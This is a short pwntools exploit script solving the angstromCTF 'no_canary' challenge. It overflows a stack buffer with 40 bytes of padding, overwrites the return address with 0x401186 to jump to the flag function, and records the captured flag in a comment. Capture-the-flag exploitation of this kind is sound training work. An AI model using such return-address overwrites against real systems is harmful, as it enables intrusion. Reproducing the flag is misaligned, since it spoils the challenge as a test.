from pwn import *
  
BINARY = './no_canary'
HOST = 'shell.actf.co'
PORT = 20700

context.terminal = ['tmux', 'split-w']

def start():
    if not args.REMOTE:
        print "LOCAL PROCESS"
        return process(BINARY)
    if not args.REMOTE and args.GDB:
        gdb.attach(process(BINARY))
    else:
        print "REMOTE PROCESS"
        return remote(HOST, PORT)



p = start()
if args.GDB:
    gdb.attach(p, 'b *0x4012bf\nb flag')

print(p.recvuntil("What's your name? "))


exploit = 'A'*32 + 'B'*8
flag = p64(0x401186)

p.sendline(exploit + flag)
print(p.recvline())
print(p.recvline())

# actf{that_gosh_darn_canary_got_me_pwned!}
